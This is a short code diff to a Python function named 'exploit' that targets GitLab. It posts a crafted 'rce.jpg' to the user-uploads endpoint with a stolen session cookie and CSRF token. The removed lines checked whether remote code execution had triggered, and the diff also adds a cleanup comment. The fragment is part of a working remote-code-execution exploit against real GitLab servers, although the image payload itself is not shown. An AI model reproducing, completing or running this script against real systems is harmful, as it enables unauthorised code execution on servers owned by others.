@@ -27,11 +27,6 @@ def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int) -> bool | 
     upload_file_url = f"{gitlab_url}/uploads/user"
     cookies = {'sidebar_collapsed': 'false', 'event_filter': 'all', 'hide_auto_devops_implicitly_enabled_banner_1': 'false', "_gitlab_session": session.cookies["_gitlab_session"], }
     files = {"file": ("rce.jpg", open("rce.jpg", "rb"), "image/jpeg")}
-    resp = session.post(url=upload_file_url, files=files, headers={"X-CSRF-Token": token, "Referer": upload_file_url, "Accept": "application/json"}, cookies=cookies)
+    session.post(url=upload_file_url, files=files, headers={"X-CSRF-Token": token, "Referer": upload_file_url, "Accept": "application/json"}, cookies=cookies)
 
-    if "The change you requested was rejected." in resp.text:
-        exit("[x] Upload file failed")
-    elif "Failed to process image" in resp.text:
-        print("[+] RCE triggered successfully")
-
-    os.system("rm rce.jpg && rm rce.txt")
+    os.system("rm rce.jpg && rm rce.txt") # Ask @Jean
